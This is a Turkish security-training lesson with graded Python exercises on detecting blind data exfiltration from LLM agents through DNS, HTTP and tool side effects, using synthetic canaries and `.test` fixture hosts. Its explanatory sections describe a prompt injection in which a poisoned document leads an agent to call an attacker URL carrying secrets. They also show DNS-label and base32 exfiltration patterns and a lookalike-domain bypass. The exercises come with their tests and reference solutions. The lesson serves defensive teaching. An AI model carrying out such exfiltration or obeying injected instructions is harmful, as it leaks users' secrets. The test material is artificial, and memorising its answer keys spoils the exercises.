---
id: ai-saldiri-23
title: Kör Exfiltration Kanalları
summary: Yanıt dönmese bile DNS, HTTP ve araç yan etkilerindeki canary kanıtını ölç; kanal politikasını ve sessiz veri çıkışı regresyonunu fixture üzerinde doğrula.
timeout: 45
---

::: anlat Gerçek biçimi bil, sentetik temsili ayırt et: Yanıtın olmaması veri çıkışının olmadığını göstermez

| Gerçek araç/model ne gösterir | Bu ders ne kullanır | Ne söyleyemez? |
|---|---|---|
| Kör exfiltration testlerinde saldırganın kontrolündeki bir alıcı (Burp Collaborator, interactsh ya da kendi DNS/HTTP sunucusu) dinlenir. Model veya araç cevap görmese bile alıcıya gelen DNS sorgusu ya da HTTP isteği veri çıkışının kanıtıdır. | Görev 1–3: `veri/kanal_olaylari.json`, `veri/alici_olaylari.json` ve `veri/regresyon_kayitlari.json` içindeki **sentetik** olay ve vaka kayıtları. Son adım: deneyin kendi açtığı üç yerel alıcıyla çalışır: cevapsız HTTP POST, gerçek DNS paketi alan bir UDP soketi ve bir JSONL araç kaydı. Kurulu yerel Ollama modelinin araç önerileri senin kapından geçer. | Dış ağa, gerçek DNS çözücüsüne ya da `.test` adlarına istek gitmez. Üç model kolu, modelin genel exfiltration davranışını göstermez. Canary yalnız düz ve base32 biçimlerde aranır; başka kodlamalarla yapılan sızıntı ölçülmez. |

> [!NOT]
> Görev 1–3 sentetik veriyle çalışır. Bu görevlerde ağ, soket ya da model kullanılmaz. Son adımdaki **Gerçek deney** görevi yalnız deneyin kendi açtığı yerel HTTP/UDP alıcılarını ve kurulu yerel Ollama modelini kullanır. Dış ağa veri gitmez, yeni araç indirilmez, mitmproxy çalıştırılmaz. `veri/` dosyaları her çalıştırmada çalışma klasörüne yeniden kopyalanır; kopyada yaptığın değişiklik bir sonraki çalıştırmada sıfırlanır, **kalıcılık yoktur**. Son adımın düzenlenebilir kanal dosyası ise ayrıca kalıcı tutulur. Kontrol bu dosyalardan ayrı, gizli verilerle sınar.

Bir HTTP aracı yanıt gövdesi döndürmeyebilir veya model yalnız “işlem tamamlanamadı” mesajı görebilir. Buna rağmen giden istek, DNS sorgusu veya başka bir aracın logu saldırganın kontrolündeki sentetik uç noktada gözlenebilir. Buna kör exfiltration denir: kanıt modelin doğrudan yanıtında değil, kanalın yan etkisindedir.

Bu ders gerçek veri sızdırmaz. Bütün hedefler `.test` adlarıdır. Görev 1–3'te olaylar bellek içi kayıtlardır; son adımda yalnız deneyin kendi yerel alıcıları kullanılır. Canary, gerçek hassas veri yerine konulan benzersiz bir işaretçidir. Kanal kararı, olay kanıtı ve politika regresyonu ayrı ölçülür.

**LLM ajanında kör sızdırma nasıl olur?** Bir ajanın "web sayfası getir", "log yaz", "bir adres çözümle" gibi araçları varsa, zehirli bir belge modeli şöyle bir çağrıya yönlendirebilir: `http://toplayici.saldirgan.test/?d=<gizli>`. İstek cevapsız kalabilir ya da araç hata döndürebilir. Model kullanıcıya "işlem tamamlanamadı" der ve kimse bir şey fark etmez. Oysa veri, isteğin URL'si ya da bir DNS adının etiketi olarak saldırganın alıcısına ulaşmıştır. Yalnız modelin yanıtına bakan bir güvenlik testi bu olayı "başarısız saldırı" diye kaydeder.

**Saldırgan bakışı:**

- **DNS:** Saldırgan, veriyi DNS etiketlerine böler (`parca1.parca2.c2.saldirgan.test`). Birçok ağda HTTP çıkışı kapalıdır ama DNS çözümü açıktır. DNS etiketleri büyük/küçük harf ayırmadığı için veriyi base32 gibi tek kipli bir alfabeyle kodlar. `veri/alici_olaylari.json` içindeki `e-01` olayında canary küçük harfle yazılmıştır ve düz substring araması onu **kaçırır**.
- **Benzer alan adı:** Saldırgan, izinli bir alan adıyla başlayan bir alt alan adı kullanır: `log.sirket.test.saldirgan.test`.
- **İzinli kanalı kötüye kullanmak:** İzinli bir log aracına canary yazdırır ve log sonradan dışarı aktarılır.
:::

::: tahmin Boş yanıt kanıtı siler mi?
Bir olayda canary var fakat araç yanıtı yok. Üç çıktı satırını yaz:

```python
olay = {"veri": "parca-CANARY-7", "yanit": None}
print("CANARY-7" in olay["veri"])
print(olay["yanit"] is None)
print(olay["yanit"] is None and "CANARY-7" in olay["veri"])
```

???

```cikti
True
True
True
```

Olay kaydı ve canary, yanıt olmadan da kanıttır. `None` yalnız doğrudan yanıt alınmadığını söyler; giden isteğin gerçekleşmediğini kanıtlamaz.
:::

::: gorev 1 · Kanal ve hedef politikasını olaydan önce uygula
`kanal_karari(olay, politika)` işlevini yaz. Olay tam olarak `kanal`, `hedef`, `veri` alanlarını taşısın. Kanal `dns`, `http` veya `arac`; hedef string; veri 1–64 karakterli ASCII 32–126 aralığında string olmalıdır. Hedefi küçük harfe çevirip sondaki noktaları kaldır; sonuç yalnız küçük harf, rakam, nokta ve tire içeren, `.test` ile biten bir fixture adı olmalıdır. Politika tam olarak `kanallar`, `hedefler` alanlarını taşısın. Bunlar boş olmayan, benzersiz değerlerden oluşan listelerdir; kanallar bilinen kanallardan, hedefler aynı fixture kuralına uyan kanonik adlardan oluşur. Geçersiz veride `ValueError` yükselt.

Karar sırası:

- Kanal politikada yoksa `{"izinli":False,"neden":"kanal-izinsiz","hedef":NORMAL_HEDEF}`.
- Hedef politikada yoksa aynı yapıda neden `hedef-izinsiz`.
- İkisi de izinliyse neden `izinli`, `izinli=True`.

Bu işlev olay üretmez ve ağ açmaz; yalnız aday kararını döndürür.

Görünür veri: `veri/kanal_olaylari.json`. İlk iki olay ve log olayı izinlidir. `dns` olayı `kanal-izinsiz`, iki saldırgan hedefi ise `hedef-izinsiz` almalıdır. Dört bozuk olay reddedilmelidir.

```starter
from ai_saldiri_veri import json_yukle

def kanal_karari(olay, politika):
    # KUSURLU BAŞLANGIÇ KODU: hedefi kanonikleştirmiyor (büyük harfli izinli hedef reddedilir), hedefi önekle karşılaştırıyor (log.sirket.test.saldirgan.test geçer) ve olay biçimini doğrulamıyor!
    hedef = olay["hedef"]
    if olay["kanal"] not in politika["kanallar"]:
        return {"izinli": False, "neden": "kanal-izinsiz", "hedef": hedef}
    if not any(hedef.startswith(h) for h in politika["hedefler"]):
        return {"izinli": False, "neden": "hedef-izinsiz", "hedef": hedef}
    return {"izinli": True, "neden": "izinli", "hedef": hedef}

veri = json_yukle("veri/kanal_olaylari.json")
for o in veri["olaylar"] + veri["bozuk_olaylar"]:
    try:
        k = kanal_karari(o, veri["politika"])
        print(o["kanal"], o["hedef"], "→", k["neden"])
    except ValueError as hata:
        print(o["kanal"], o["hedef"], "→ RED:", hata)
```

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules["__main__"].__file__).resolve().parent))
from ai_saldiri_veri import hazirla
hazirla("ai-saldiri-23")
```

```test
OLAY = {"kanal": "dns", "hedef": "Collector.TEST.", "veri": "CANARY-7"}
POLITIKA = {"kanallar": ["dns", "http"], "hedefler": ["collector.test"]}
def sozlesme(fn):
    try:
        if fn(OLAY, POLITIKA) != {"izinli": True, "neden": "izinli", "hedef": "collector.test"}:
            return False
        if fn(dict(OLAY, kanal="arac", hedef="internal.test"), POLITIKA) != {"izinli": False, "neden": "kanal-izinsiz", "hedef": "internal.test"}:
            return False
        if fn(dict(OLAY, hedef="internal.test"), POLITIKA) != {"izinli": False, "neden": "hedef-izinsiz", "hedef": "internal.test"}:
            return False
        if fn(dict(OLAY, veri=" " * 63 + "~"), POLITIKA)["izinli"] is not True:
            return False
        if fn(dict(OLAY, veri="x"), POLITIKA)["izinli"] is not True:
            return False
        for olay, politika in [
            (None, POLITIKA), (dict(OLAY, ek=1), POLITIKA), (dict(OLAY, kanal="smtp"), POLITIKA),
            (dict(OLAY, hedef=""), POLITIKA), (dict(OLAY, hedef="collector.example"), POLITIKA),
            (dict(OLAY, hedef="collector_test"), POLITIKA), (dict(OLAY, veri=""), POLITIKA),
            (dict(OLAY, veri="x" * 65), POLITIKA), (dict(OLAY, veri="a\x1fb"), POLITIKA),
            (dict(OLAY, veri="a\x7fb"), POLITIKA), (dict(OLAY, veri="ğ"), POLITIKA),
            (OLAY, None), (OLAY, dict(POLITIKA, ek=1)), (OLAY, {"kanallar": [], "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["dns", "dns"], "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["smtp"], "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": "dns", "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["dns"], "hedefler": []}),
            (OLAY, {"kanallar": ["dns"], "hedefler": ["Collector.test"]}),
            (dict(OLAY, hedef=3), POLITIKA), (dict(OLAY, hedef="a_b.test"), POLITIKA),
            (dict(OLAY, veri=[1]), POLITIKA),
            (OLAY, {"kanallar": ("dns",), "hedefler": ["collector.test"]}),
            (OLAY, {"kanallar": ["dns"], "hedefler": ("collector.test",)}),
            (OLAY, {"kanallar": ["dns"], "hedefler": ["collector.test", "collector.test"]}),
        ]:
            try:
                fn(olay, politika)
                return False
            except ValueError:
                pass
        return True
    except Exception:
        return False
ok(sozlesme(kanal_karari), "kanal önceliği, fixture hedefi, veri sınırı ve politika şeması korunmalı")
def m_kanal(olay, politika):
    genis = dict(politika, kanallar=list(politika["kanallar"]) + [olay["kanal"]])
    return kanal_karari(olay, genis)
def m_hedef(olay, politika):
    hedef = olay["hedef"].lower().rstrip(".")
    genis = dict(politika, hedefler=list(politika["hedefler"]) + [hedef])
    return kanal_karari(olay, genis)
def m_veri(olay, politika):
    return kanal_karari(dict(olay, veri=olay["veri"][:64]), politika)
for ad, mutant in [("her kanalı izinli yapan", m_kanal), ("her hedefi izinli yapan", m_hedef), ("uzun veriyi sessizce kesen", m_veri)]:
    ok(not sozlesme(mutant), "yanlış çözüm/mutant yakalanmalı: " + ad)
```

```solution
def kanal_karari(olay, politika):
    import re
    bilinen = ("dns", "http", "arac")
    def normal_hedef(deger):
        if not isinstance(deger, str):
            raise ValueError("hedef string olmalı")
        hedef = deger.lower().rstrip(".")
        if not re.fullmatch(r"[a-z0-9.-]+", hedef) or not hedef.endswith(".test"):
            raise ValueError("hedef fixture adı olmalı")
        return hedef
    if not isinstance(olay, dict) or set(olay) != {"kanal", "hedef", "veri"}:
        raise ValueError("olay şeması geçersiz")
    if olay["kanal"] not in bilinen:
        raise ValueError("kanal geçersiz")
    hedef = normal_hedef(olay["hedef"])
    veri = olay["veri"]
    if not isinstance(veri, str) or not 1 <= len(veri) <= 64 or any(ord(c) < 32 or ord(c) > 126 for c in veri):
        raise ValueError("veri geçersiz")
    if not isinstance(politika, dict) or set(politika) != {"kanallar", "hedefler"}:
        raise ValueError("politika şeması geçersiz")
    if not isinstance(politika["kanallar"], list) or not politika["kanallar"] or any(x not in bilinen for x in politika["kanallar"]):
        raise ValueError("kanal politikası geçersiz")
    if len(politika["kanallar"]) != len(set(politika["kanallar"])):
        raise ValueError("kanallar benzersiz olmalı")
    if not isinstance(politika["hedefler"], list) or not politika["hedefler"]:
        raise ValueError("hedef politikası geçersiz")
    hedefler = [normal_hedef(x) for x in politika["hedefler"]]
    if any(x != x.lower().rstrip(".") for x in politika["hedefler"]) or len(hedefler) != len(set(hedefler)):
        raise ValueError("politika hedefleri kanonik ve benzersiz olmalı")
    if olay["kanal"] not in politika["kanallar"]:
        return {"izinli": False, "neden": "kanal-izinsiz", "hedef": hedef}
    if hedef not in hedefler:
        return {"izinli": False, "neden": "hedef-izinsiz", "hedef": hedef}
    return {"izinli": True, "neden": "izinli", "hedef": hedef}
```

```hint
Olayı ve politikayı ayrı doğrula. Kanalı önce, normalize hedefi sonra karşılaştır. Veri uzunluğunu ve karakter aralığını karardan bağımsız olarak her zaman denetle.
```
:::

::: anlat Kanıt olayda ve canary'dedir
Kör kanal analizi için her olayın kimliği, kanalı, hedefi, taşıdığı fixture verisi ve doğrudan yanıt durumu tutulur. `yanit=None` doğrudan cevap yok demektir; boş string ise boş bir cevap alınmıştır ve `None` ile aynı değildir. Canary içeren olay, yanıttan bağımsız olarak kanıt listesine girer.

Kanal sayıları gözlem yüzeyini, canary izleri veri çıkışını, yanıtsız kanıt listesi ise kör çalışan vakaları gösterir. Bu rapor gerçek gizli veri çıkarmak yerine ölçülebilir sentetik kanıt üretir.

**Sık tuzaklar:**

- **`None` ile `""` karışıklığı:** `yanit=""` cevap geldiği ama boş olduğu anlamına gelir. `yanit=None` ise hiç cevap gelmediği anlamına gelir. İkisini aynı saymak, kör kanıt listesini bozar (`e-03`).
- **Yanıta göre kanıt aramak:** Yanıtı olmayan olayı rapordan atmak, kör exfiltration'ın tam olarak saklandığı yeri siler.
- **Hedefi önekle denetlemek:** `startswith("log.sirket.test")` kontrolü, `log.sirket.test.saldirgan.test` hedefine de izin verir. Hedef kanonikleştirildikten sonra **tam eşitlikle** karşılaştırılır.
- **Kararı olaydan sonra vermek:** Kanal kararı gönderimden **önce** çalışmalıdır. Olaydan sonra yapılan kontrol yalnız raporlar, engellemez.
:::

::: gorev 2 · Yanıtsız olaylardaki canary kanıtını say
`kor_kanit_raporu(olaylar, canary)` işlevini yaz. Girdi liste; her olay tam olarak `id`, `kanal`, `hedef`, `veri`, `yanit` alanlarını taşısın. Kimlik boş olmayan ve benzersiz string, kanal `dns`, `http` veya `arac`, hedef ilk görevdeki kanonik `.test` adı, veri 0–64 karakterli ASCII 32–126 string olmalıdır. Yanıt `None` veya ASCII 32–126 string olabilir; boş string geçerlidir. Canary 1–32 karakterli ASCII 33–126 stringdir. Geçersiz veride `ValueError` yükselt.

Dönüş:

```text
{"olay":N,
 "kanal_sayilari":{"dns":D,"http":H,"arac":A},
 "canary_izleri":[...],"yanitsiz_kanit":[...]}
```

`canary_izleri`, verisinde canary substring'i bulunan bütün olayları içerir. `yanitsiz_kanit` bunların yalnız `yanit is None` olanlarını içerir. Listeler alfabetik kimlik sıralıdır. Boş olay listesinde sayımlar sıfır, listeler boştur. Girdi sırası sonucu değiştirmemeli ve olaylar değiştirilmemelidir.

Görünür veri: `veri/alici_olaylari.json`. Doğru raporda canary izleri `e-02`, `e-03` ve `e-05`'tir; yanıtsız kanıt yalnız `e-02` olur. `e-01` (küçük harf) iz sayılmaz.

```starter
from ai_saldiri_veri import json_yukle

def kor_kanit_raporu(olaylar, canary):
    # KUSURLU BAŞLANGIÇ KODU: boş yanıtı ("") yanıtsız sayıyor, yalnız yanıtsız olaylarda canary arıyor ve olay biçimini doğrulamıyor!
    sayim = {"dns": 0, "http": 0, "arac": 0}
    izler, yanitsiz = [], []
    for o in olaylar:
        sayim[o["kanal"]] = sayim.get(o["kanal"], 0) + 1
        if not o["yanit"] and canary in o["veri"]:
            izler.append(o["id"])
            yanitsiz.append(o["id"])
    return {"olay": len(olaylar), "kanal_sayilari": sayim, "canary_izleri": sorted(izler), "yanitsiz_kanit": sorted(yanitsiz)}

veri = json_yukle("veri/alici_olaylari.json")
print(kor_kanit_raporu(veri["olaylar"], veri["canary"]))
for o in veri["bozuk_olaylar"]:
    try:
        kor_kanit_raporu([o], veri["canary"])
        print(o["id"], "KABUL edildi (yanlış)")
    except ValueError as hata:
        print(o["id"], "reddedildi:", hata)
```

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules["__main__"].__file__).resolve().parent))
from ai_saldiri_veri import hazirla
hazirla("ai-saldiri-23")
```

```test
import copy
OLAYLAR = [
    {"id": "o1", "kanal": "dns", "hedef": "collector.test", "veri": "x-CANARY-7", "yanit": None},
    {"id": "o2", "kanal": "http", "hedef": "collector.test", "veri": "CANARY-7", "yanit": ""},
    {"id": "o3", "kanal": "arac", "hedef": "logs.test", "veri": "CANARY-7-y", "yanit": "ok"},
    {"id": "o4", "kanal": "dns", "hedef": "collector.test", "veri": "temiz", "yanit": None},
]
BEKLENEN = {"olay": 4, "kanal_sayilari": {"dns": 2, "http": 1, "arac": 1}, "canary_izleri": ["o1", "o2", "o3"], "yanitsiz_kanit": ["o1"]}
def sozlesme(fn):
    try:
        once = copy.deepcopy(OLAYLAR)
        if fn(OLAYLAR, "CANARY-7") != BEKLENEN or OLAYLAR != once or fn(list(reversed(OLAYLAR)), "CANARY-7") != BEKLENEN:
            return False
        if fn([], "C") != {"olay": 0, "kanal_sayilari": {"dns": 0, "http": 0, "arac": 0}, "canary_izleri": [], "yanitsiz_kanit": []}:
            return False
        if fn([], "!" * 31 + "~")["olay"] != 0:
            return False
        if fn([dict(OLAYLAR[0], veri=" " * 63 + "~", yanit=" ~")], "bulunmayan")["olay"] != 1:
            return False
        for olaylar, canary in [
            (None, "C"), (OLAYLAR, ""), (OLAYLAR, "x" * 33), (OLAYLAR, "a b"), (OLAYLAR, "a\x7fb"),
            (OLAYLAR + [OLAYLAR[0]], "C"), ([None], "C"), ([dict(OLAYLAR[0], ek=1)], "C"),
            ([dict(OLAYLAR[0], id="")], "C"), ([dict(OLAYLAR[0], kanal="smtp")], "C"),
            ([dict(OLAYLAR[0], hedef="Collector.test")], "C"),
            ([dict(OLAYLAR[0], veri="x" * 65)], "C"),
            ([dict(OLAYLAR[0], veri="a\x1fb")], "C"), ([dict(OLAYLAR[0], veri="a\x7fb")], "C"),
            ([dict(OLAYLAR[0], yanit=3)], "C"), ([dict(OLAYLAR[0], yanit="\n")], "C"),
            ([dict(OLAYLAR[0], yanit="a\x7fb")], "C"),
            (OLAYLAR, [1]), ([dict(OLAYLAR[0], id=3)], "C"),
            ([dict(OLAYLAR[0], hedef=3)], "C"), ([dict(OLAYLAR[0], hedef="collector.test.")], "C"),
            ([dict(OLAYLAR[0], hedef="a_b.test")], "C"), ([dict(OLAYLAR[0], hedef="collector.com")], "C"),
            ([dict(OLAYLAR[0], veri=[1])], "C"), ([dict(OLAYLAR[0], yanit="\x1f")], "C"),
        ]:
            try:
                fn(olaylar, canary)
                return False
            except ValueError:
                pass
        return True
    except Exception:
        return False
ok(sozlesme(kor_kanit_raporu), "kanal sayımı, canary substring'i ve yanıtsız kanıt korunmalı")
def m_kanal(olaylar, canary):
    return kor_kanit_raporu([x for x in olaylar if x["kanal"] == "http"], canary)
def m_yanit(olaylar, canary):
    sonuc = kor_kanit_raporu(olaylar, canary)
    sonuc["yanitsiz_kanit"] = []
    return sonuc
def m_bos(olaylar, canary):
    return kor_kanit_raporu([dict(x, yanit=None if x["yanit"] == "" else x["yanit"]) for x in olaylar], canary)
for ad, mutant in [("DNS ve araç kanıtını düşüren", m_kanal), ("yanıtsız kanıtı gizleyen", m_yanit), ("boş cevabı yanıt yok sayan", m_bos)]:
    ok(not sozlesme(mutant), "yanlış çözüm/mutant yakalanmalı: " + ad)
```

```solution
def kor_kanit_raporu(olaylar, canary):
    import re
    if not isinstance(olaylar, list):
        raise ValueError("olaylar liste olmalı")
    if not isinstance(canary, str) or not 1 <= len(canary) <= 32 or any(ord(c) < 33 or ord(c) > 126 for c in canary):
        raise ValueError("canary geçersiz")
    sonuc = {"olay": 0, "kanal_sayilari": {"dns": 0, "http": 0, "arac": 0}, "canary_izleri": [], "yanitsiz_kanit": []}
    kimlikler = set()
    for olay in olaylar:
        if not isinstance(olay, dict) or set(olay) != {"id", "kanal", "hedef", "veri", "yanit"}:
            raise ValueError("olay şeması geçersiz")
        if not isinstance(olay["id"], str) or not olay["id"] or olay["id"] in kimlikler:
            raise ValueError("olay kimliği geçersiz")
        if olay["kanal"] not in sonuc["kanal_sayilari"]:
            raise ValueError("kanal geçersiz")
        if not isinstance(olay["hedef"], str):
            raise ValueError("hedef string olmalı")
        if olay["hedef"] != olay["hedef"].lower().rstrip("."):
            raise ValueError("hedef kanonik olmalı")
        if not re.fullmatch(r"[a-z0-9.-]+", olay["hedef"]):
            raise ValueError("hedef karakterleri geçersiz")
        if not olay["hedef"].endswith(".test"):
            raise ValueError("hedef fixture adı olmalı")
        if not isinstance(olay["veri"], str) or len(olay["veri"]) > 64 or any(ord(c) < 32 or ord(c) > 126 for c in olay["veri"]):
            raise ValueError("veri geçersiz")
        if olay["yanit"] is not None and (not isinstance(olay["yanit"], str) or any(ord(c) < 32 or ord(c) > 126 for c in olay["yanit"])):
            raise ValueError("yanıt geçersiz")
        kimlikler.add(olay["id"])
        sonuc["kanal_sayilari"][olay["kanal"]] += 1
        if canary in olay["veri"]:
            sonuc["canary_izleri"].append(olay["id"])
            if olay["yanit"] is None:
                sonuc["yanitsiz_kanit"].append(olay["id"])
    sonuc["olay"] = len(kimlikler)
    sonuc["canary_izleri"].sort()
    sonuc["yanitsiz_kanit"].sort()
    return sonuc
```

```hint
Her olayda kanal sayısını artır. Canary için substring kontrolü yap; canary bulunduğunda önce iz listesine ekle, sonra yalnız `yanit is None` koşulunu ayrı denetle.
```
:::

::: anlat Engel kararı ile yan etki karşılaştırılır
Kör sızdırma regresyonunda izinli olmayan bir olayın gözlenmesi politika bypass'ıdır. Bu olay canary taşıyor ve doğrudan yanıt alınmıyorsa sessiz sızıntıdır. Yanıtsız kanıt izinli vakalarda da görülebilir; bu ölçüt politika ihlali değil, kanıtın yanıttan bağımsızlığıdır.

Fixture tutarlılığında canary veya yanıt ancak olay gerçekleştiyse bulunabilir. Temiz vaka, olay durumu izinle aynı olan ve reddedildiği halde canary gözlenmeyen vakadır. İzinli olduğu halde olayı oluşmayan vaka ayrıca işlev hatası olarak raporlanır.
:::

::: gorev 3 · Politika bypass'ı ile sessiz sızıntıyı ayrı raporla
`kor_politika_regresyonu(kayitlar)` işlevini yaz. Girdi liste; her kayıt tam olarak `vaka_id`, `izinli`, `olay_oldu`, `canary_goruldu`, `yanit_alindi` alanlarını taşısın. Kimlik boş olmayan ve benzersiz string, diğer alanlar bool olmalıdır. `canary_goruldu=True` veya `yanit_alindi=True` ise `olay_oldu=True` zorunludur. Geçersiz veya tutarsız kayıtta `ValueError` yükselt.

Dönüş:

```text
{"vaka":N,"politika_bypassi":[...],"sessiz_sizinti":[...],
 "yanitsiz_kanit":[...],"beklenen_olay_yok":[...],"temiz":[...]}
```

- `politika_bypassi`: izinsizken olay gerçekleşmiş.
- `sessiz_sizinti`: izinsiz, olay ve canary var, yanıt yok.
- `yanitsiz_kanit`: izinden bağımsız olarak olay ve canary var, yanıt yok.
- `beklenen_olay_yok`: izinli fakat olay gerçekleşmemiş.
- `temiz`: `olay_oldu == izinli` ve izinsiz vakada canary yok.

Listeler alfabetik sıralıdır; bir vaka birden fazla sorun listesine girebilir. Boş girdi için boş rapor dön. Girdi sırası sonucu etkilememeli ve kayıtlar değişmemelidir.

Görünür veri: `veri/regresyon_kayitlari.json`. Beklenen sınıflar README tablosundadır. `v-mesru-kor` hem `yanitsiz_kanit` hem `temiz` listesinde yer alır; iki tutarsız kayıt reddedilmelidir.

```starter
from ai_saldiri_veri import json_yukle

def kor_politika_regresyonu(kayitlar):
    # KUSURLU BAŞLANGIÇ KODU: sızıntıyı yanıta bakarak tanımlıyor (yanıtsız sızıntıyı kaçırır), yanıtsız kanıtı yalnız izinsiz vakalarda arıyor ve tutarsız kaydı reddetmiyor!
    rapor = {"vaka": len(kayitlar), "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}
    for v in sorted(kayitlar, key=lambda x: x["vaka_id"]):
        if not v["izinli"] and v["olay_oldu"]:
            rapor["politika_bypassi"].append(v["vaka_id"])
            if v["canary_goruldu"] and v["yanit_alindi"]:
                rapor["sessiz_sizinti"].append(v["vaka_id"])
            if v["canary_goruldu"] and not v["yanit_alindi"]:
                rapor["yanitsiz_kanit"].append(v["vaka_id"])
        if v["izinli"] and not v["olay_oldu"]:
            rapor["beklenen_olay_yok"].append(v["vaka_id"])
        if v["olay_oldu"] == v["izinli"]:
            rapor["temiz"].append(v["vaka_id"])
    return rapor

veri = json_yukle("veri/regresyon_kayitlari.json")
for k, v in kor_politika_regresyonu(veri["kayitlar"]).items():
    print(k, v)
for b in veri["bozuk_kayitlar"]:
    try:
        kor_politika_regresyonu([b])
        print(b["vaka_id"], "KABUL edildi (yanlış)")
    except ValueError as hata:
        print(b["vaka_id"], "reddedildi:", hata)
```

```setup
import sys
from pathlib import Path
sys.path.insert(0, str(Path(sys.modules["__main__"].__file__).resolve().parent))
from ai_saldiri_veri import hazirla
hazirla("ai-saldiri-23")
```

```test
import copy
KAYITLAR = [
    {"vaka_id": "v1", "izinli": False, "olay_oldu": True, "canary_goruldu": True, "yanit_alindi": False},
    {"vaka_id": "v2", "izinli": False, "olay_oldu": True, "canary_goruldu": True, "yanit_alindi": True},
    {"vaka_id": "v3", "izinli": True, "olay_oldu": True, "canary_goruldu": True, "yanit_alindi": False},
    {"vaka_id": "v4", "izinli": False, "olay_oldu": False, "canary_goruldu": False, "yanit_alindi": False},
    {"vaka_id": "v5", "izinli": True, "olay_oldu": False, "canary_goruldu": False, "yanit_alindi": False},
    {"vaka_id": "v6", "izinli": False, "olay_oldu": True, "canary_goruldu": False, "yanit_alindi": False},
    {"vaka_id": "v7", "izinli": True, "olay_oldu": True, "canary_goruldu": False, "yanit_alindi": True},
]
BEKLENEN = {"vaka": 7, "politika_bypassi": ["v1", "v2", "v6"], "sessiz_sizinti": ["v1"], "yanitsiz_kanit": ["v1", "v3"], "beklenen_olay_yok": ["v5"], "temiz": ["v3", "v4", "v7"]}
def sozlesme(fn):
    try:
        once = copy.deepcopy(KAYITLAR)
        if fn(KAYITLAR) != BEKLENEN or KAYITLAR != once or fn(list(reversed(KAYITLAR))) != BEKLENEN:
            return False
        if fn([]) != {"vaka": 0, "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}:
            return False
        for kayitlar in [
            None, {}, [None], KAYITLAR + [KAYITLAR[0]], [dict(KAYITLAR[0], ek=1)],
            [dict(KAYITLAR[0], vaka_id="")], [dict(KAYITLAR[0], izinli=0)],
            [dict(KAYITLAR[0], olay_oldu=1)], [dict(KAYITLAR[0], canary_goruldu=0)],
            [dict(KAYITLAR[0], yanit_alindi=1)],
            [dict(KAYITLAR[3], canary_goruldu=True)], [dict(KAYITLAR[3], yanit_alindi=True)],
            [dict(KAYITLAR[0], vaka_id=3)],
        ]:
            try:
                fn(kayitlar)
                return False
            except ValueError:
                pass
        return True
    except Exception:
        return False
ok(sozlesme(kor_politika_regresyonu), "bypass, sessiz sızıntı, yanıtsız kanıt ve temizlik ayrımı korunmalı")
def m_sessiz(kayitlar):
    sonuc = kor_politika_regresyonu(kayitlar)
    sonuc["sessiz_sizinti"] = []
    return sonuc
def m_yanitsiz(kayitlar):
    sonuc = kor_politika_regresyonu(kayitlar)
    sonuc["yanitsiz_kanit"] = list(sonuc["sessiz_sizinti"])
    return sonuc
def m_temiz(kayitlar):
    sonuc = kor_politika_regresyonu(kayitlar)
    sonuc["temiz"] = sorted(x["vaka_id"] for x in kayitlar if not x["olay_oldu"])
    return sonuc
for ad, mutant in [("sessiz sızıntıyı gizleyen", m_sessiz), ("izinli yanıtsız kanıtı düşüren", m_yanitsiz), ("izinli olayları temiz saymayan", m_temiz)]:
    ok(not sozlesme(mutant), "yanlış çözüm/mutant yakalanmalı: " + ad)
```

```solution
def kor_politika_regresyonu(kayitlar):
    if not isinstance(kayitlar, list):
        raise ValueError("kayıtlar liste olmalı")
    sonuc = {"vaka": 0, "politika_bypassi": [], "sessiz_sizinti": [], "yanitsiz_kanit": [], "beklenen_olay_yok": [], "temiz": []}
    vakalar = set()
    for kayit in kayitlar:
        if not isinstance(kayit, dict) or set(kayit) != {"vaka_id", "izinli", "olay_oldu", "canary_goruldu", "yanit_alindi"}:
            raise ValueError("kayıt şeması geçersiz")
        if not isinstance(kayit["vaka_id"], str) or not kayit["vaka_id"] or kayit["vaka_id"] in vakalar:
            raise ValueError("vaka kimliği geçersiz")
        if not all(isinstance(kayit[x], bool) for x in ("izinli", "olay_oldu", "canary_goruldu", "yanit_alindi")):
            raise ValueError("bool alanlar geçersiz")
        if (kayit["canary_goruldu"] or kayit["yanit_alindi"]) and not kayit["olay_oldu"]:
            raise ValueError("yan etki olay gerektirir")
        vakalar.add(kayit["vaka_id"])
        bypass = not kayit["izinli"] and kayit["olay_oldu"]
        kanit = kayit["olay_oldu"] and kayit["canary_goruldu"] and not kayit["yanit_alindi"]
        if bypass:
            sonuc["politika_bypassi"].append(kayit["vaka_id"])
        if bypass and kayit["canary_goruldu"] and not kayit["yanit_alindi"]:
            sonuc["sessiz_sizinti"].append(kayit["vaka_id"])
        if kanit:
            sonuc["yanitsiz_kanit"].append(kayit["vaka_id"])
        if kayit["izinli"] and not kayit["olay_oldu"]:
            sonuc["beklenen_olay_yok"].append(kayit["vaka_id"])
        if kayit["olay_oldu"] == kayit["izinli"] and (kayit["izinli"] or not kayit["canary_goruldu"]):
            sonuc["temiz"].append(kayit["vaka_id"])
    sonuc["vaka"] = len(vakalar)
    for alan in ("politika_bypassi", "sessiz_sizinti", "yanitsiz_kanit", "beklenen_olay_yok", "temiz"):
        sonuc[alan].sort()
    return sonuc
```

```hint
Önce bypass ve yanıtsız kanıt koşullarını ayrı hesapla. Sessiz sızıntı bypass'a canary ve yanıt yokluğunu ekler; temizlikte olay/izin eşitliğiyle reddedilen vakadaki canary'yi birlikte denetle.
```
:::


::: anlat Yanıt yokken gerçek alıcıdaki izi bul
Ham sentetik örnek aynı Pafta sunucusunda `/data/ai-saldiri-23-kanallar.txt` adresindedir. Mevcut Markdown renderer linkleri tıklanabilir yapmaz; sunucu adresine bu yolu yaz. Çalıştır ayrı kalıcı `calisma/ai-saldiri-23/kanallar.json` kopyasının yolunu/içeriğini gösterir; dış editör/Python ile değiştirip yeniden Çalıştır, düzenlemen korunur. Test ayrı dosya kullanır.

